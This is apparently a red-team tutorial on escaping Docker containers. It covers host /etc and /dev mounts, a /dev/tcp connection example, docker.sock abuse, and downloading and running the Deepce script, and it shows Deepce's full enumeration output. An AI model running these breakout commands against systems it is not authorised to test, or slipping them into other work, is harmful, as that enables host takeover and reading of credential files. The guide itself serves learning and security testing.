# Container Breakouts

This document outlines various techniques to break out of Docker containers.  
From basic misconfigurations to more advanced exploitations, this guide will help you understand and demonstrate how attackers can escape from containers to the host system.  

## Prerequisites
- *Linux*
- [*Docker*](https://www.docker.com/)  

## Basic Container Breakouts 

### Sensitive Volume Mounts 

One of the simplest ways to break out of a container is through improperly configured volume mounts.  
If sensitive directories from the host are mounted into the container, an attacker can exploit this to gain access to host files.  

#### Example: Accessing /etc 


```bash
# Run a container with /etc mounted
docker run -it --rm -v /etc:/mnt/etc ubuntu /bin/bash

# Inside the container, access the host's /etc directory
ls /mnt/etc
cat /mnt/etc/passwd
```
In this example, mounting `/etc` from the host to `/mnt/etc` in the container allows the attacker to read sensitive information from the host's `/etc` directory, such as the `passwd` file.  


### Host Device Mounts 

Mounting host devices directly into containers can provide attackers with an easy way to interact with the host's hardware and kernel.

#### Example: Mounting /dev 


```bash
# Run a container with /dev mounted
docker run -it --rm -v /dev:/dev ubuntu /bin/bash

# Inside the container, manipulate host devices
ls /dev
```
By mounting the `/dev` directory, attackers can interact with host devices, potentially leading to privilege escalation or data exfiltration.  
Note that you can even initiate TCP connections, for example:  

```bash
#!/bin/bash

# Connect to example.com on port 80 and send an HTTP GET request
exec 3<>/dev/tcp/example.com/80

# Send the HTTP GET request to fetch the homepage
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" >&3

# Read and print the response from the server
while IFS= read -r line <&3; do
    echo "$line"
done

# Close the TCP connection
exec 3>&-
exec 3<&-
```  


## Advanced Container Breakouts 

### Leveraging Docker Sockets 
Docker socket (`/var/run/docker.sock`) exposure is a critical misconfiguration vulnerability that can allow container breakout by interacting directly with the Docker API.  

#### Example: Using Docker Socket 


```bash
# Run a container with Docker socket mounted
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash

# Inside the container, start another container
apt-get update && apt-get install -y docker.io
docker run -it --rm alpine /bin/sh
```

Mounting the Docker socket into a container allows the attacker to control the Docker daemon of the host, enabling them to start new containers with higher privileges or access the host filesystem directly.

### Using Deepce for Advanced Breakouts 

[*Deepce*](https://github.com/stealthcopter/deepce) is a powerful tool for enumerating containers configuration and identifying possible exploits.  
It automates many of the steps required to find and exploit these vulnerabilities.

#### Example: Using Deepce 
 
1. **Install Deepce** :


```bash
# Run a container with Docker socket mounted
docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/bash

# Inside the container, install deepce
apt update && apt install -y wget curl jq
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
sh deepce.sh

```
 
**Deepce Output**:  


```console

                      ##         .
                ## ## ##        ==
             ## ## ## ##       ===
         /"""""""""""""""""\___/ ===
    ~~~ {~~ ~~~~ ~~~ ~~~~ ~~~ ~ /  ===- ~~~
         \______ X           __/
           \    \         __/
            \____\_______/
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \   ENUMERATE
   / /_/ /  __/  __/ /_/ / (__/  __/  ESCALATE
   \__,_/\___/\___/ .___/\___/\___/  ESCAPE
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

==========================================( Colors )==========================================
[+] Exploit Test ............ Exploitable - Check this out
[+] Basic Test .............. Positive Result
[+] Another Test ............ Error running check
[+] Negative Test ........... No
[+] Multi line test ......... Yes
Command output
spanning multiple lines

Tips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See https://stealthcopter.github.io/deepce

===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. No
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Yes
srw-rw---- 1 root 133 0 Jul 26 05:18 /var/run/docker.sock
[+] Sock is writable ........ Yes
The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

To see full info from the docker sock output run the following

curl -s --unix-socket /var/run/docker.sock http://localhost/info

KernelVersion:6.8.11-amd64
OperatingSystem:Kali GNU/Linux Rolling
OSType:linux
Architecture:x86_64
NCPU:16
DockerRootDir:/var/lib/docker
Name:hackstation
ServerVersion:27.1.1
Namespaces:{Containers:moby
[+] Docker Version .......... 27.1.1
[+] CVE–2019–13139 .......... No
[+] CVE–2019–5736 ........... No
==================================( Enumerating Container )===================================
[+] Container ID ............ 90a8d89927f5
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 172.17.0.2 
[+] DNS Server(s) ........... 192.168.93.2 
[+] Host IP ................. 172.17.0.1
[+] Operating System ........ GNU/Linux
[+] Kernel .................. 6.8.11-amd64
[+] Arch .................... x86_64
[+] CPU ..................... 13th Gen Intel(R) Core(TM) i7-1370P
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget
/usr/bin/hostname
[+] Dangerous Capabilities .. capsh not installed, listing raw capabilities
libcap2-bin is required but not installed
apt install -y libcap2-bin

Current capabilities are:
CapInh: 0000000000000000
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000
> This can be decoded with: "capsh --decode=00000000a80425fb"
[+] SSHD Service ............ No
[+] Privileged Mode ......... Unknown
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... Yes
The docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

[+] Other mounts .............. No
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rw-r--r-- 1 root root 39K Jul 26 06:34 /deepce.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... total 4.0K
drwxr-x--- 2 ubuntu ubuntu 4.0K Jun  5 02:06 ubuntu
[+] Hashes in shadow file ............... No
[+] Searching for app dirs .............. 
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further

TODO Enumerate container using sock
==============================================================================================
```

As you can see deepce will automatically scan for vulnerabilities and provide exploitation paths for container breakout, making it a valuable tool for red teamers.  
For example in our case it says that the docker sock is mounted and suggests we can leverage that.  
it also suggest the command for retrieving info from the docker sock:  
```sh
curl -s --unix-socket /var/run/docker.sock http://localhost/info | jq
```  

